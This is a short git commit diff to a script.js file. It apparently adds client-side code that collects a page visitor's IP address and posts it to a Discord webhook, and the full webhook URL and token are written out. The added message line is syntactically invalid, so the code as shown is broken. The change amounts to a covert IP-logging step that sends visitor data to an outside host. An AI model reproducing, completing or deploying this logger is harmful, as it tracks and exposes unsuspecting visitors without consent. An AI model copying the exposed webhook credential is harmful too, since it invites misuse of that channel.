da653e5f147f9b39826d7593c5f62508a0c06a98
EphRex <128737077+EphRex@users.noreply.github.com>
2024-06-02 19:04:55 +0100

    Update script.js

--- script.js
+++ script.js
@@ -1,7 +1,9 @@
 const whurl = "https://discord.com/api/webhooks/1246559249325097052/UzuMt97coTW1187qKif_WXZnHvLg4n-1C_M0NsBYtP2OBDDVv5RbZy3IZZMh33lzagkB"
-
+var getIP = function(json) {
+      document.getElementById("IP").innerHTML = json.ip;
+    }
 const msg = {
-    "content": "Test"
+    "content": ${IP}
 }
 
 fetch(whurl + "?wait=true", 
